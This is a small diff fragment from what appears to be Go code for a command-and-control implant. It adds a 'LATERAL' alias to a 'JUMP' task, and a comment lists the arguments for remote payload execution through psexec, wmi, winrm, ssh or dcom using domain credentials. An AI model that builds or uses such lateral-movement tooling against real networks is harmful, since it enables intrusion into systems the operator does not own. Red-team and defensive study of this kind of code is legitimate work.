@@ -1064,7 +1064,7 @@ func dispatchTask(t transport, task taskWire) {
 	// Args JSON: {"method":"psexec|wmi|winrm|ssh|dcom","host":"<ip>","payload":"<file>",
 	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}
 
-	case "JUMP":
+	case "JUMP", "LATERAL":
 		var la struct {
 			Method  string `json:"method"`
 			Host    string `json:"host"`
